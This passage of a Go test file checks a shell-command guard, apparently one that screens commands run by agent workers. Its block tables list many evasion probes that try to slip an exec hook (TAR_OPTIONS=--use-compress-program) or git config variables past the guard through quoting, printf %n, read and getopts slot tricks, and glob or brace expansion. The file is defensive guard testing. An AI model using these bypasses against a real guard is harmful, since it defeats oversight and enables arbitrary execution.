	noPanicArgv := []struct {
		name string
		argv []string
	}{
		{"P-R11-MF1-c argv tar -f dangling", []string{"tar", "-f"}},
		{"P-R11-MF1-d argv tar --file dangling", []string{"tar", "--file"}},
		{"P-R11-MF1-e argv tar -cf then -C dangling", []string{"tar", "-cf", "/dev/null", "-C"}},
	}
	for _, tc := range noPanicArgv {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", argv: tc.argv}, "")
			if got == "" {
				t.Fatalf("rtGuardCwd(%v) returned empty verdict", tc.argv)
			}
		})
	}

	blockCases := []struct {
		name, cmd, want string
	}{
		// R11-MF-2: quoted/escaped/enum-expanded/env -S declaration heads.
		{"P-R11-MF2-a dq export demotion", `X='1 TAR_OPTIONS=--use-compress-program=pig'; "export" FOO=$X; tar -cf /dev/null /dev/null`, "env dynamic export"},
		{"P-R11-MF2-b backslash export demotion", `X='1 TAR_OPTIONS=--use-compress-program=pig'; \export FOO=$X; tar -cf /dev/null /dev/null`, "env dynamic export"},
		{"P-R11-MF2-b2 sq export demotion", `X='1 TAR_OPTIONS=--use-compress-program=pig'; 'export' FOO=$X; tar -cf /dev/null /dev/null`, "env dynamic export"},
		{"P-R11-MF2-c enum export demotion", `X='1 TAR_OPTIONS=--use-compress-program=pig'; for E in export; do $E FOO=$X; done; tar -cf /dev/null /dev/null`, "env dynamic export"},
		{"P-R11-MF2-d env -S rewrite demotion", `X='1 TAR_OPTIONS=--use-compress-program=pig'; env -S 'command export a=1 b=2' FOO=$X`, "env dynamic export"},
		// R11-MF-3: printf -v glued/repeated, read/getopts dynamic slots.
		{"P-R11-MF3-a printf -vTAR_OPTIONS glued", `bash -c 'set -a; printf -vTAR_OPTIONS "%s" "--use-compress-program=pig"; tar -cf /dev/null /dev/null'`, "env TAR_OPTIONS"},
		{"P-R11-MF3-b printf repeated -v", `bash -c 'set -a; printf -v x -v TAR_OPTIONS "%s" "--use-compress-program=pig"; tar -cf /dev/null /dev/null'`, "env TAR_OPTIONS"},
		{"P-R11-MF3-c read -p dynamic split", `bash -c 'set -a; X="x TAR_OPTIONS"; read -p $X <<< "--use-compress-program=pig"; tar -cf /dev/null /dev/null'`, "env dynamic read"},
		{"P-R11-MF3-d getopts dynamic optstring", `set -a; X='1 GIT_CONFIG_COUNT'; getopts $X -1`, "env dynamic getopts"},
		{"P-R11-MF3-e getopts glob optstring", `set -a; getopts p* -1`, "env dynamic getopts"},
		// R11 closure: quoted dynamic OPTION-ZONE words pick their option
		// letters (or terminator status) at runtime even though the expansion
		// itself never field-splits.
		{"P-R11-MF3-f printf dq dynamic format", `bash -c 'set -a; OPT="-vTAR_OPTIONS"; printf "$OPT" "%s" "--use-compress-program=pig"; tar -cf /dev/null /dev/null'`, "env dynamic printf"},
		// NOTE: the value must NOT be a static-literal single assignment —
		// the collector in-lines safe literals, so `OPT="vTAR_OPTIONS"` would
		// statically resolve `-$OPT` to `-vTAR_OPTIONS` and hit the (correct)
		// static `env TAR_OPTIONS` verdict instead of exercising the dynamic
		// branch. Concatenating an undefined expansion keeps the word dynamic.
		{"P-R11-MF3-g printf dq dash-prefixed", `bash -c 'set -a; OPT="vTAR_OPTIONS$NOPE"; printf "-$OPT" "%s" "--use-compress-program=pig"; tar -cf /dev/null /dev/null'`, "env dynamic printf"},
		{"P-R11-MF3-h read dq dash-prefixed cluster", `bash -c 'set -a; OPT="aTAR_OPTIONS"; read "-$OPT" <<< "--use-compress-program=pig"; tar -cf /dev/null /dev/null'`, "env dynamic read"},
		{"P-R11-MF3-i getopts dq terminator shift", `set -a; H="--"; getopts "$H" opt TAR_OPTIONS`, "env TAR_OPTIONS"},
		{"P-R11-MF3-j getopts dq terminator dyn name", `set -a; H="--"; V='GIT_CONFIG_COUNT'; getopts "$H" opt "$V"`, "env dynamic getopts"},
		// R11 closure: quoted/escaped declaration heads inside the BASH-dialect
		// parse (bash -c) lose field-splitting exemption exactly like the
		// POSIX-level probes a/b above.
		{"P-R11-MF2-e bash -c dq export demotion", `bash -c 'X="1 TAR_OPTIONS=--use-compress-program=pig"; "export" FOO=$X; tar -cf /dev/null /dev/null'`, "env dynamic export"},
		{"P-R11-MF2-f bash -c backslash export demotion", `bash -c 'X="1 TAR_OPTIONS=--use-compress-program=pig"; \export FOO=$X; tar -cf /dev/null /dev/null'`, "env dynamic export"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// 放行守卫正例(R11 零假阳纪律):无包装声明内建、带引号包装导出、
	// printf 格式串/-- 终止、带引号 read 提示符、静态/带引号 getopts
	// 与正常 tar 带值选项全部保持 ALLOW。
	allowCases := []struct {
		name, cmd string
	}{
		{"R11-pos tar -cf quoted OUT", `tar -cf "$OUT" /dev/null`},
		{"R11-pos tar -C xf normal", `tar -C /tmp -xf "$ARCHIVE"`},
		{"R11-pos bare export unquoted", `export FOO=$X`},
		{"R11-pos prefix-assign export", `A=1 export FOO=$X`},
		{"R11-pos bash -c export quoted", `bash -c 'export FOO="$X"'`},
		{"R11-pos command export quoted", `command export FOO="$X"`},
		{"R11-pos printf format quoted", `printf '%s\n' "$X"`},
		{"R11-pos printf dq static format", `printf "val=$X\n"`},
		{"R11-pos printf -- terminator", `printf -- -v TAR_OPTIONS`},
		{"R11-pos printf -v benign", `printf -v myvar '%s' "$X"`},
		{"R11-pos printf -vmyvar glued benign", `printf -vmyvar '%s' "$X"`},
		{"R11-pos read -p quoted prompt", `bash -c 'read -p "$PROMPT" x <<< y'`},
		{"R11-pos read -r plain", `read -r line`},
		{"R11-pos getopts static optstring", `getopts ":ab:" opt`},
		{"R11-pos getopts quoted optstring", `getopts "$OPTS" opt`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// TestGuard_V622_ReviewerR4Probes covers the Reviewer R4 / Oracle R12 audit
// matrix: printf write-target closure (glued/clustered -v, static %n slots
// with Bash format reuse, dynamic format strings and array-subscripted write
// targets — R4-MF-1/MF-3/MF-4), printf first-word glob expansion into the
// option zone (R4-MF-2), GNU tar --occurrence as an OPTIONAL-argument option
// (R4-MF-5), read's -i value letter and glued dynamic value tails (R4-SF-1),
// and the getopts dynamic first operand standby slot narrowed to a real "--"
// expansion shape (R4-SF-2). Zero new production symbols are referenced here:
// every probe goes through rtGuardCwd so an independent verifier can copy
// this file onto the pre-fix tree 9139e0e and reproduce FAIL directly.
func TestGuard_V622_ReviewerR4Probes(t *testing.T) {
	blockCases := []struct {
		name, cmd, want string
	}{
		// R4-MF-1: preScanVarMutations never counted glued/clustered -v or
		// %n writes, so a second write into `cmd` stayed static-bindable.
		{"P-R4-MF1-a printf glued -v double write", `bash -c 'cmd=/bin/true; printf -vcmd %s pig; "$cmd"'`, ""},
		{"P-R4-MF1-b printf clustered -v double write", `bash -c 'cmd=/bin/true; printf -v cmd %s pig; "$cmd"'`, ""},
		// R4-MF-3: static format-string %n write targets were never scanned.
		{"P-R4-MF3-a printf %n TAR_OPTIONS", `bash -c 'printf "%n" TAR_OPTIONS'`, "env TAR_OPTIONS"},
		{"P-R4-MF3-b printf %n aligned arg", `bash -c 'printf "%s %n" x TAR_OPTIONS'`, "env TAR_OPTIONS"},
		{"P-R4-MF3-c printf -- %n", `bash -c 'printf -- "%n" TAR_OPTIONS'`, "env TAR_OPTIONS"},
		{"P-R4-MF3-d printf width-star %n alignment", `bash -c 'printf "%*s %n" 1 x TAR_OPTIONS'`, "env TAR_OPTIONS"},
		{"P-R4-MF3-e printf dynamic fmt args", `bash -c 'printf x"$FMT" "%s" x'`, "env dynamic printf"},
		{"P-R4-MF3-f printf %n unquoted arg splitting", `bash -c 'printf "%s %n" $X TAR_OPTIONS'`, "env dynamic printf"},
		{"P-R4-MF3-g printf %n dynamic target", `bash -c 'printf "%n" "$X"'`, "env dynamic printf"},
		{"P-R4-MF3-h printf %n array subscript hook", `bash -c 'printf "%n" '\''TAR_OPTIONS[0]'\'''`, "env TAR_OPTIONS"},
		{"P-R4-MF3-i printf %n dynamic subscript", `bash -c 'printf "%n" "x[$(echo 0)]"'`, "env dynamic printf"},
		// R13-SF-4: inside bash double quotes '$' starts a parameter expansion,
		// so the positional designator must be backslash-escaped to reach
		// printf as literal '%2$s%n' (unescaped '$s' expanded empty and the
		// probe tested the wrong string).
		{"P-R4-MF3-j printf %n positional slot", `bash -c 'printf "%2\$s%n" x TAR_OPTIONS'`, "env dynamic printf"},
		// R14 closure: bash printf honours length modifiers on '%n', the
		// '%*2$n' star-positional width is unvettable, and a glob-expanded
		// filename can legitimately spell '%n' (`lit%n`) so a glob-only
		// format word WITH arguments is no longer trusted.
		{"P-R14-1 printf glob-only fmt with args", `printf lit* TAR_OPTIONS`, "env dynamic printf"},
		// R13-MF-1: even with NO trailing argument an unquoted glob format
		// word can expand to MULTIPLE words at runtime — match[0] becomes the
		// real format string and match[1] the first argument, so `lit%n`
		// content would write into whatever match[1] names. Only a split-safe
		// (quoted) zero-argument spelling stays safe.
		{"P-R13-MF1 printf glob fmt no args", `printf lit*`, "env dynamic printf"},
		{"P-R14-2 printf %ln length modifier", `bash -c 'printf "%ln" TAR_OPTIONS'`, "env TAR_OPTIONS"},
		{"P-R14-3 printf %hhn length modifier", `bash -c 'printf "%hhn" TAR_OPTIONS'`, "env TAR_OPTIONS"},
		{"P-R14-4 printf star-positional %n", `bash -c 'printf "%*2\$n" 1 TAR_OPTIONS'`, "env dynamic printf"},
		// R14 closure: read's separate value operand word-splits at runtime
		// when unquoted (`read -p $X` with X="p cmd"), shifting the positional
		// layout. The argv layer already refused this shape at 9139e0e
		// (readClusterStep vets the consumed operand), so the discriminating
		// regression pin is the direct preScanVarMutations unit row below the
		// positive table.
		{"P-R14-5-shell read -p unquoted value blocks", `bash -c 'cmd=/bin/true; X="p cmd"; read -p $X <<< pig; "$cmd"'`, ""},
		// R4-MF-4: write-target subscripts must validate their base name and
		// reject arithmetic/dynamic subscripts fail-closed. NOTE: an UNQUOTED
		// arr[0] is itself a glob character class (litHasUnquotedGlobOrTilde),
		// so the static-subscript spellings are single-quoted here.
		{"P-R4-MF4-a printf -v array hook", `bash -c 'printf -v '\''TAR_OPTIONS[0]'\'' "%s" x'`, "env TAR_OPTIONS"},
		{"P-R4-MF4-b printf -v glued array hook", `bash -c 'printf "-vTAR_OPTIONS[0]" "%s" x'`, "env TAR_OPTIONS"},
		{"P-R4-MF4-c printf -v arithmetic subscript", `bash -c 'printf -v x[1+1] "%s" y'`, "env dynamic printf"},
		{"P-R4-MF4-d printf -v dangling subscript", `bash -c 'printf -v x[0 "%s" y'`, "env dynamic printf"},
		// R4-MF-2: a glob word first in the format position may expand into
		// -vNAME at runtime, desynchronizing the option zone.
		{"P-R4-MF2-a printf glob star format", `printf * '%s' x`, "env dynamic printf"},
		{"P-R4-MF2-b printf glob qmark format", `printf ? '%s' x`, "env dynamic printf"},
		// R4-MF-5: GNU tar --occurrence[=N] is optional-argument — the bare
		// spelling consumes NO operand, so the following exec hook must be
		// scanned instead of swallowed as the "occurrence value".
		{"P-R4-MF5-a tar occurrence swallow glued hook", `tar --occurrence --use-compress-program=pig -cf /dev/null /dev/null`, ""},
		{"P-R4-MF5-b tar occurrence swallow split hook", `tar --occurrence --use-compress-program pig -cf /dev/null /dev/null`, ""},
		// R4-SF-1: a dynamic placeholder inside read's option-letter zone is
		// unvettable, including a glued -p tail that word-splits at runtime.
		{"P-R4-SF1-a read glued -p unquoted dyn", `bash -c 'read -p$P x <<< y'`, "env dynamic read"},
		// R13-MF-4: a glued dynamic prompt tail that can expand EMPTY at
		// runtime (`read -p"$PROMPT"` with PROMPT='') turns into `read -p`
		// which consumes the NEXT argv word as the prompt — the positional
		// write-target layout diverges from the static scan.
		{"P-R13-MF4 read glued empty-able dq prompt", `bash -c 'read -p"$PROMPT" answer <<< y'`, "env dynamic read"},
		// R4-SF-2: a dynamic getopts first operand may expand to exactly "--",
		// shifting NAME out of its static slot.
		{"P-R4-SF2-a getopts dyn terminator hook", `set -a; H="--"; getopts "$H" opt TAR_OPTIONS`, "env TAR_OPTIONS"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// 放行守卫正例(R4 零假阳纪律):普通/复用格式串参数、带引号动态格式串
	// 无参、静态下标合法数组写、安全字面前缀 glob、tar 正常带参、read -p/-i
	// 带引号提示与初始值、getopts 带冒号/字母的动态 OPTSTRING 全部保持 ALLOW。
	allowCases := []struct {
		name, cmd string
	}{
		{"R4-pos printf static fmt benign", `bash -c 'printf "%s %s" "$A" "$B"'`},
		{"R4-pos printf fmt reuse benign", `bash -c 'printf "%s" "$A" "$B"'`},
		{"R4-pos printf dq fmt no args", `bash -c 'printf x"$FMT"'`},
		{"R4-pos printf unquoted arg no %n", `printf '%s\n' $UNQUOTED`},
		{"R4-pos printf %n benign var", `bash -c 'printf "%n" myvar'`},
		{"R4-pos printf %n benign array", `bash -c 'printf "%n" '\''arr[0]'\'''`},
		{"R4-pos printf -v benign array", `bash -c 'printf -v '\''arr[0]'\'' "%s" x'`},
		// R14 closure: the glob-only literal-prefix positive keeps ONLY the
		// zero-argument spelling — with no arguments nothing can be written
		// regardless of what the expansion spells; ANY trailing argument
		// makes the dynamically shaped format unvettable (blocked above).
		{"R4-pos printf glob literal prefix quoted no args", `printf 'lit*'`},
		{"R14-pos printf strftime width conv", `bash -c 'printf "%10(%Y)T\n" -1'`},
		{"R4-pos printf quoted star format", `printf '*' '%s' x`},
		{"R4-pos tar occurrence value benign", `tar --occurrence 2 -tf /dev/null`},
		{"R4-pos tar occurrence glued benign", `tar --occurrence=2 -tf /dev/null`},
		{"R4-pos read -p glued dq prompt", `bash -c 'read -p"Prompt: $PROMPT" line <<< y'`},
		{"R4-pos read -ei separate value", `bash -c 'read -ei "$DEFAULT" answer <<< y'`},
		{"R4-pos getopts colon dyn optstring", `getopts ":$OPTS" opt TAR_OPTIONS`},
		{"R4-pos getopts colon dyn optstring arg", `getopts ":$OPTS" opt "$arg"`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}

	// P-R14-5 direct unit pin: rtGuardCwd cannot discriminate this fix
	// because screenReadEnvWrite's readClusterStep already refuses a
	// word-splitting separate value operand at the argv layer — the
	// preScanVarMutations taint is DEPTH defense for the shell-string
	// static-bind analysis inside bash -c. The regression is pinned at
	// the function itself: an unquoted expansion in read's consumed value
	// slot (`read -p $X` — X="p cmd" word-splits at runtime, shifting the
	// positional layout so the REAL write targets diverge from the static
	// operand scan) must taint every static bind, while the split-safe
	// quoted spelling keeps the scan clean.
	t.Run("P-R14-5 preScanVarMutations read unquoted value slot", func(t *testing.T) {
		p := syntax.NewParser()
		f, err := p.Parse(strings.NewReader(`X="p cmd"; read -p $X <<< pig; echo ok`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		_, tainted := preScanVarMutations(f)
		if !tainted {
			t.Fatal("preScanVarMutations(read -p $X): allTainted = false, want true (unquoted value slot word-splits at runtime)")
		}
	})
	t.Run("P-R14-5-pos preScanVarMutations read quoted value slot", func(t *testing.T) {
		p := syntax.NewParser()
		f, err := p.Parse(strings.NewReader(`read -p "$PROMPT" x <<< pig; echo ok`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		_, tainted := preScanVarMutations(f)
		if tainted {
			t.Fatal("preScanVarMutations(read -p \"$PROMPT\" x): allTainted = true, want false (quoted value stays one argv word)")
		}
	})
}

// TestGuard_V622_OracleR13Probes pins the Oracle R13 audit closure:
// printf zero-argument dynamic/glob format write slots (R13-MF-1), the
// '%q' conversion letter mis-parsed as a length modifier (R13-MF-2),
// read's static-cluster end-letter misjudgment `-eii` (R13-MF-3), a glued
// dynamic read prompt tail that can expand empty and swallow the next
// argv word (R13-MF-4), the printf/read/getopts AST pre-scan alignment
// (R13-SF-1), dynWordCanSpellDashDash exactness and the '$$' PID
// recognition (R13-SF-2) and external-path /usr/bin/printf exemption
// (R13-SF-3). Pure-function pins reference only existing production
// symbols plus parse helpers, so the file can be copied onto the pre-fix
// tree 056cb3e5 to reproduce FAIL directly.
func TestGuard_V622_OracleR13Probes(t *testing.T) {
	// ---- Pure-function pins (R13-SF-4) ----
	t.Run("R13-MF1 printfFmtWriteSlots zero-arg glob fmt is dyn", func(t *testing.T) {
		if _, dyn := printfFmtWriteSlots("sample*"+cmdSubPlaceholderGlob, nil); !dyn {
			t.Fatal("printfFmtWriteSlots(glob-only fmt, no args): dyn = false, want true (glob expands to many words — match[0] becomes the format, match[1] a '%n' write target)")
		}
	})
	t.Run("R13-MF1-pos printfFmtWriteSlots zero-arg split-safe fmt stays safe", func(t *testing.T) {
		if _, dyn := printfFmtWriteSlots("sample"+cmdSubPlaceholderQuoted, nil); dyn {
			t.Fatal("printfFmtWriteSlots(quoted dyn fmt, no args): dyn = true, want false (no arguments — nothing can be written)")
		}
	})
	t.Run("R13-MF2 printfFmtSlots %q%n is conv+write pair", func(t *testing.T) {
		slots, pos := printfFmtSlots("%q%n")
		if pos || len(slots) != 2 || slots[0] || !slots[1] {
			t.Fatalf("printfFmtSlots(%%q%%n) = %v positional=%v, want [false true] positional=false ('q' is a conversion letter, not a length modifier)", slots, pos)
		}
	})
	t.Run("R13-MF2-pos printfFmtSlots %qn is single non-write slot", func(t *testing.T) {
		slots, pos := printfFmtSlots("%qn")
		if pos || len(slots) != 1 || slots[0] {
			t.Fatalf("printfFmtSlots(%%qn) = %v positional=%v, want [false] positional=false (the trailing 'n' is literal text after the %%q conversion)", slots, pos)
		}
	})
	t.Run("R13-MF3 preScanVarMutations read -eii counts sample", func(t *testing.T) {
		p := syntax.NewParser()
		f, err := p.Parse(strings.NewReader(`read -eii sample <<< ok`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		writes, tainted := preScanVarMutations(f)
		if tainted {
			t.Fatal("preScanVarMutations(read -eii sample): allTainted = true, want false")
		}
		if writes["sample"] != 1 {
			t.Fatalf("preScanVarMutations(read -eii sample): writes[sample] = %d, want 1 (the glued -i VALUE ends the cluster — trailing 'i' text never consumes the next word)", writes["sample"])
		}
	})
	t.Run("R13-MF4 readDynClusterHit empty-able glued prompt tail blocks", func(t *testing.T) {
		if hit := readDynClusterHit("-p" + cmdSubPlaceholderQuoted); hit == "" {
			t.Fatal("readDynClusterHit(-p\"$PROMPT\") = \"\", want non-empty (an empty PROMPT collapses the glued tail so -p swallows the next argv word)")
		}
	})
	t.Run("R13-MF4-pos readDynClusterHit static-prefix prompt tail allows", func(t *testing.T) {
		if hit := readDynClusterHit("-pPrompt: " + cmdSubPlaceholderQuoted); hit != "" {
			t.Fatalf("readDynClusterHit(-p\"Prompt: $PROMPT\") = %q, want empty (static non-empty prefix keeps the glued tail non-empty at runtime)", hit)
		}
	})
	t.Run("R13-SF2 dynWordCanSpellDashDash precision", func(t *testing.T) {
		if dynWordCanSpellDashDash("---" + cmdSubPlaceholderQuoted) {
			t.Fatal("dynWordCanSpellDashDash(---$X) = true, want false (three static dashes can never shrink to exactly '--')")
		}
		if dynWordCanSpellDashDash(cmdSubPlaceholderAbsDq) {
			t.Fatal("dynWordCanSpellDashDash(abs-dq) = true, want false (absolute-path expansions always start with '/')")
		}
		if dynWordCanSpellDashDash("0" + cmdSubPlaceholderQuoted) {
			t.Fatal("dynWordCanSpellDashDash(PID encoding) = true, want false ('$$' is decimal digits, never '--')")
		}
		if !dynWordCanSpellDashDash("--" + cmdSubPlaceholderQuoted) {
			t.Fatal("dynWordCanSpellDashDash(--$X) = false, want true (an empty expansion spells exactly '--')")
		}
	})

	// ---- End-to-end guard verdicts ----
	blockCases := []struct {
		name, cmd, want string
	}{
		// R13-MF-2 argv layer: '%q' was skipped as a length modifier, so
		// printf "%q%n" hid its write conversion and printf "%qn" invented
		// a false '%n' write.
		{"P-R13-MF2-a printf %q%n write", `bash -c 'printf "%q%n" x TAR_OPTIONS'`, "env TAR_OPTIONS"},
		// R13-MF-3: `read -eii sample` — the trailing 'i' is the glued -i
		// initial value text, so `sample` remains the write target; the
		// pre-scan must count it so a double write into `sample` blocks the
		// static bind.
		{"P-R13-MF3 read -eii sample rewrite", `bash -c 'sample=/bin/true; read -eii sample <<< pig; "$sample"'`, ""},
		// R13-MF-4 shell layer: an empty-expanding glued prompt swallows the
		// positional layout inside a bash -c script.
		{"P-R13-MF4-shell read empty-able prompt in script", `bash -c 'cmd=/bin/true; read -p"$PROMPT" answer <<< ok; "$cmd"'`, ""},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// 放行守卫正例(R13 零假阳纪律):'%q' 引号转换、分离写法 read 提示符、
	// 静态非空前缀粘连提示符、printf/read/getopts 带安全动态参数的组合脚
	// 本、'$$' PID OPTSTRING 与显式路径 /usr/bin/printf 全部保持 ALLOW。
	allowCases := []struct {
		name, cmd string
	}{
		{"R13-pos printf %qn conversion benign", `bash -c 'printf "%qn" "$X"'`},
		{"R13-pos read -p separate dq prompt", `bash -c 'read -p "$PROMPT" answer <<< y'`},
		{"R13-pos read -p glued static-prefix prompt", `bash -c 'read -p"Prompt: $PROMPT" line <<< y'`},
		// R13-SF-1: combination scripts with dynamic but safe printf/read/
		// getopts arguments must not all-taint the pre-scan — `cmd` keeps
		// its static bind and the script stays ALLOW.
		{"R13-SF1 printf dyn args in script", `bash -c 'cmd=/bin/true; printf "%s" "$DATA"; "$cmd"'`},
		{"R13-SF1 read static-prefix prompt in script", `bash -c 'cmd=/bin/true; read -p"Prompt: $PROMPT" answer <<< ok; "$cmd"'`},
		{"R13-SF1 getopts colon dyn optstring in script", `bash -c 'cmd=/bin/true; getopts ":$OPTS" opt; "$cmd"'`},
		// R13-SF-2: '$$' expands to decimal PID digits — it can never spell
		// the "--" terminator, so the standby NAME slot is not vetted.
		{"R13-SF2 getopts PID optstring", `bash -c 'getopts "$$" opt "$arg"'`},
		// R13-SF-3: an explicit-path printf invokes /usr/bin/printf — a
		// child process can never write shell variables, so neither the
		// dynamic format text nor '%n'-looking content is vetted as a
		// shell write.
		{"R13-SF3 usr bin printf dyn format", `/usr/bin/printf "label=$LABEL %s" value`},
		{"R13-SF3 usr bin printf static format", `/usr/bin/printf 'label=%s' value`},
		// R14-Oracle-S4: the R13 combination-script counterpart of the
		// external-path exemption — inside bash -c the AST pre-scan must not
		// all-taint on the external printf either, so `cmd` keeps its static
		// bind (this is the 10th allow row the R13 closure counted).
		{"R13-SF3-script usr bin printf dyn format in script", `bash -c 'cmd=/bin/true; /usr/bin/printf "label=$LABEL %s" value; "$cmd"'`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}

	// R14-Oracle-S4: the two R13 discriminating assertions that were never
	// landed. `%10(%Y)T%n` proves the strftime conversion consumes exactly
	// one non-write slot BEFORE the real '%n' write (slot shape, not just a
	// rejection verdict), and the read cluster row pins the unknown-letter
	// fail-closed path with a STATIC non-empty glued tail so the R13-MF-4
	// empty-tail rule cannot produce a coincidental pass.
	t.Run("R13-SF4 printfFmtSlots strftime width slot vector", func(t *testing.T) {
		slots, pos := printfFmtSlots("%10(%Y)T%n")
		if pos || len(slots) != 2 || slots[0] || !slots[1] {
			t.Fatalf("printfFmtSlots(%%10(%%Y)T%%n) = %v positional=%v, want [false true] positional=false", slots, pos)
		}
	})
	t.Run("R13-SF4 readDynClusterHit unknown letter before value letter", func(t *testing.T) {
		if hit := readDynClusterHit("-Zptext" + cmdSubPlaceholderQuoted); hit == "" {
			t.Fatal("readDynClusterHit(-Zptext+$P) = \"\", want non-empty (unknown option letter 'Z' fails closed even though a value letter follows)")
		}
	})
}

// parseBashSingleCmdWord parses src with the bash dialect and returns the
// args-th word of its single call expression (test helper for the Oracle
// R14 parser probes).
func parseBashSingleCmdWord(t *testing.T, src string, arg int) *syntax.Word {
	t.Helper()
	p := syntax.NewParser(syntax.Variant(syntax.LangBash))
	f, err := p.Parse(strings.NewReader(src), "")
	if err != nil {
		t.Fatalf("parse %q: %v", src, err)
	}
	if len(f.Stmts) != 1 {
		t.Fatalf("parse %q: %d stmts, want 1", src, len(f.Stmts))
	}
	call, ok := f.Stmts[0].Cmd.(*syntax.CallExpr)
	if !ok {
		t.Fatalf("parse %q: cmd is %T, want *syntax.CallExpr", src, f.Stmts[0].Cmd)
	}
	if arg >= len(call.Args) {
		t.Fatalf("parse %q: %d args, want index %d", src, len(call.Args), arg)
	}
	return call.Args[arg]
}

// blankSubCollector returns a subCollector with no static binds, no script
// writes and no env taints — the fixture state the Oracle R14 parser
// probes pin (e.g. unbound "$OLDPWD").
func blankSubCollector() *subCollector {
	return &subCollector{
		staticVars:   map[string]string{},
		enumVars:     map[string]string{},
		taintedVars:  map[string]bool{},
		enumCmdWords: map[string][]string{},
		ssaBlocked:   map[string]bool{},
	}
}

// TestGuard_V622_OracleR14Probes pins the Oracle R14 audit closure:
// unquoted brace expansion never encodes as a static single word
// (R14-M1), the unbound "$OLDPWD" placeholder is no longer granted the
// never-empty absolute-dir class (R14-M2), the two wordToArg PID
// encoders exclude Slice/Repl-style derived expansions through
// simpleParamName (R14-M3), explicit-path printf skips the builtin write
// scan in the AST pre-scan (R14-S1), printf's zero-argument exemption
// keeps pure-tilde format words while real globs/braces still fail
// closed (R14-S2) and awk's --source= empty program fragment survives
// collection (R14-S3). Pure-function pins reference only existing
// production symbols plus parse helpers, so the file can be copied onto
// the pre-fix tree 27eaccb to reproduce FAIL directly.
func TestGuard_V622_OracleR14Probes(t *testing.T) {
	// ---- R14-M1: brace expansion parser/encoding pins ----
	t.Run("R14-M1 parser SplitBraces yields BraceExp", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo tag{red,blue}`, 1)
		cp := *w
		cp.Parts = append([]syntax.WordPart(nil), w.Parts...)
		syntax.SplitBraces(&cp)
		found := false
		for _, part := range cp.Parts {
			if _, ok := part.(*syntax.BraceExp); ok {
				found = true
			}
		}
		if !found {
			t.Fatal("SplitBraces(tag{red,blue}): no *syntax.BraceExp in copy — dependency contract broken")
		}
	})
	t.Run("R14-M1 wordToArg brace word is dynamic", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo tag{red,blue}`, 1)
		s, static := wordToArg(w)
		if static {
			t.Fatalf("wordToArg(tag{red,blue}) = (%q, true), want static=false (brace expansion multiplies the word)", s)
		}
		if !strings.Contains(s, cmdSubPlaceholderGlob) {
			t.Fatalf("wordToArg(tag{red,blue}) = %q, want the glob placeholder encoding", s)
		}
		if _, dyn := printfFmtWriteSlots(s, nil); !dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil): dyn = false, want true (brace expansion multiplies the zero-argument format word)", s)
		}
	})
	t.Run("R14-M1 collector wordToArg brace word is dynamic", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo tag{red,blue}`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("subCollector.wordToArg(tag{red,blue}) = (%q, true), want static=false", s)
		}
		if _, dyn := printfFmtWriteSlots(s, nil); !dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil): dyn = false, want true", s)
		}
	})
	t.Run("R14-M1-pos single-quoted brace stays static", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo 'tag{red,blue}'`, 1)
		s, static := wordToArg(w)
		if !static || s != "tag{red,blue}" {
			t.Fatalf("wordToArg('tag{red,blue}') = (%q, %v), want (tag{red,blue}, true) — quoting suppresses brace expansion", s, static)
		}
		if _, dyn := printfFmtWriteSlots(s, nil); dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil): dyn = true, want false", s)
		}
		s2, static2 := blankSubCollector().wordToArg(w)
		if !static2 || s2 != "tag{red,blue}" {
			t.Fatalf("subCollector.wordToArg('tag{red,blue}') = (%q, %v), want (tag{red,blue}, true)", s2, static2)
		}
	})
	t.Run("R14-M1 brace word spanning quotes is dynamic", func(t *testing.T) {
